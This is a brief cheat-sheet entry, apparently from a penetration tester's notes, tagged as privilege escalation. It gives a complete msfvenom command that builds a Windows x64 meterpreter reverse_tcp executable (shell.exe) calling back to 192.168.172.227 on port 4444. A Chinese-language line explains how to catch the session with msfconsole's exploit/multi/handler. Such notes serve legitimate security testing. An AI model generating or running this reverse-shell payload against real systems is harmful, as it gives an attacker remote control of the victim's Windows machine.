---
cmd_type: Privilege Escalation
service: msfvenom
protocol:
port:
tags:
  - cmd
  - "#Reverseshell"
  - "#msfvenom"
syntax: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.172.227 LPORT=4444 -f exe > shell.exe
OS: windows
---

使用msfconsole的 use exploit/multi/handler 来进行监听，生成meterpreter进程